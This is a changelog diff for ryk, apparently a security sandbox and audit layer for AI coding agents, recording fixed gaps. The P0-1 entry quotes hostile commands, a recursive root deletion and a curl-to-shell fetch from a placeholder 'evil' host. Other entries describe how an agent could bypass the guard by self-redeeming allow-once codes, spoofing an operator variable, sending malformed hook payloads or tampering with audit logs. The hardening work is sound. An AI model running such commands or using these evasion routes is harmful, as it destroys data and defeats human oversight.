@@ -1,5 +1,39 @@
 # Changelog
 
+## [Unreleased]
+
+### Security (OS sandbox audit 2026-08-13)
+
+* **Landlock truncation integrity:** Linux OS-enforced sessions now require Landlock ABI 3+; ABI 1/2 degrade or fail closed because they do not mediate `truncate(2)` and `open(O_TRUNC)`. Doctor reports the probed ABI and gap.
+* **Linux FUSE profile parity:** the protect-on bootstrap protocol now carries every parent launch grant class, including read-only and host-config paths, so child profile reconstruction and attestation hashes remain identical.
+* **Canonical host-config grants:** existing host-config and ancestor-instruction paths are canonicalized and revalidated, preventing symlink retargets into secret trees or outside approved roots.
+* **Live backend requirements:** `--require-backend strong-sandbox` now accepts a planned OS attach, while `landlock` specifically requires a Landlock plan; child attach failures still abort launch.
+* **Verified descriptor scrub:** sandbox child handshakes fail closed unless inherited-FD cleanup is verified after the fallback path.
+* **Honest network evidence:** macOS route-forced banners and audit posture now state that UDP/QUIC remains unrestricted.
+* **Trustworthy stress probes:** mediated stress tests use a trusted host fixture outside the workspace, retain a workspace-plant anti-spoof check, and assert `strong-mediated` evidence on deny probes.
+* **Pre-opened stdio residual:** credentials and platform docs now explain that inherited FDs 0/1/2 can retain access outside filesystem path grants.
+
+### Security (P0 audit 2026-08-12)
+
+* **Shell comment truncation bypass (P0-1):** `#` is now treated as a comment only when it starts a word (POSIX), so `echo safe#; rm -rf /` no longer truncates evaluation to `echo safe`, and command substitutions glued after `#` (`echo x#$(curl evil|sh)`) are still extracted and evaluated. Segmentation also always evaluates the full original line when it yields a single candidate.
+* **Allow-once self-service bypass (P0-2):** `pending_exceptions.jsonl` now stores only a keyed SHA-256 hash of the redeem code (schema v2); the plaintext code is memory-only and shown solely on the operator's controlling terminal, never in agent-visible output or on disk. Legacy plaintext (v1) rows fail closed on read. The pending/allow-once directory is hardened to `0700` (files remain `0600`). `ryk allow-once *` was removed from the default and strict-preset permit lists so an agent cannot invoke redeem as an allowed command.
+* **`RYK_OPERATOR` removed as an auth signal (P0-3):** operator-only paths (allow-once redeem, allowlist mutations, baseline pack disable) now require an interactive controlling TTY and fail closed otherwise. The `RYK_OPERATOR` environment variable is gone — it authenticated nobody, since a child process can set it on itself.
+* **Audit write-path redaction hardened (P0-4):** the bounded, alloc-free redactor used by the hash-chain and summary writers now runs the structured sensitive-key scan (and URL userinfo detection), matching `redactAlloc`. Structured secrets such as `{"password":"…"}`, `Authorization: Bearer …`, and `mysql://user:pw@host` are now redacted in `events.jsonl`, `summary.json`, `summary.md`, and `ryk replay` output. Redaction is idempotent over existing `[REDACTED…]` markers.
+* **Audit hash chain fork under interleaved writers (P0-5):** the session writer re-syncs the chain tip from disk before an append when the events file grew underneath it (a shim appended), and writes positionally at the true end of file instead of the process-global seek offset. Interleaved parent/shim/parent appends now verify clean under `ryk replay`, while any mid-chain edit still fails verification.
+
+**User-visible behavior changes:** `RYK_OPERATOR` no longer authorizes anything (use an interactive terminal); `ryk allow-once *` is no longer auto-allowed by the default policy; the allow-once redeem code is shown only on the operator terminal.
+
+### Security (P1 audit 2026-08-12)
+
+* **Shim unaudited-exec gap closed (P1-1):** when the session audit open fails, the PATH shim now probes the control root to distinguish the by-design Seatbelt/Landlock write-deny residual from audit-file tamper. Tamper-shaped failures (e.g. `chmod 000 events.jsonl` with a writable control root) now **fail closed** — the allowed exec is denied rather than run with no audit record. Genuine residuals drop a workspace gap marker; the parent appends an `audit_degraded` event at session end (also for parent-attested degraded sessions), and `ryk replay` / `ryk doctor` surface degraded sessions.
+* **Cursor/agent hook fails closed (P1-2):** the bare-`ryk` stdin hook (`beforeShellExecution` / Claude-compatible entries) no longer fails open on malformed JSON, oversized payloads, unknown formats, or command-less shell payloads — they emit dual-contract deny JSON and exit 2 (the host block code). Recognized non-shell tool hooks still pass through.
+* **MCP proxy deny-default (P1-3):** unknown, vendor-namespaced, or side-effecting MCP methods (`completion/complete`, `logging/setLevel`, `vendor/*`, future spec methods) are denied and audited instead of forwarded unmediated. Only `initialize`, `ping`, `notifications/*`, `tools/list`, `resources/list`, and `prompts/list` pass ungated; see `docs/mcp.md`.
+* **Honest setup completion copy (P1-4):** `ryk start` no longer prints "You're now protected by ryk" after hook-only verification. The end card states what was verified (protection grade: hook), that setup attaches no OS sandbox, and points at the session banner (`RYK_SESSION_SANDBOX_GRADE`) and `docs/compatibility.md`.
+* **Telemetry is opt-in (P1-5):** missing consent state now means disabled — nothing is queued or sent until `ryk telemetry enable`. `RYK_NO_TELEMETRY=1` remains a hard off that overrides even explicit opt-in. The payload contract (fixed allowlist, `$ip:0`, no person profile) is unchanged.
+* **Intercept proxy DNS-rebinding fence (P1-6):** after a hostname passes policy, the proxy re-checks every resolved address and pins the validated one (no re-resolution). Loopback, private, link-local, and cloud-metadata answers are refused unless `network.allow` explicitly lists the class (`localhost`, `private`, `metadata`) or exact IP; the attempt is denied with a `network_connect_denied` audit event and a 403 to the client.
+
+**User-visible behavior changes:** telemetry is now opt-in (`ryk telemetry enable`); `ryk start` completion copy states the verified grade instead of an absolute protection claim; the MCP proxy denies unknown methods (previously forwarded); the Cursor/agent hook denies malformed payloads (previously silent permit); shim execs with a tamper-shaped audit log are denied; degraded-audit sessions are visible in `ryk replay` and `ryk doctor`.
+
 ## [1.2.17] - 2026-08-12
 
 ## What's Changed
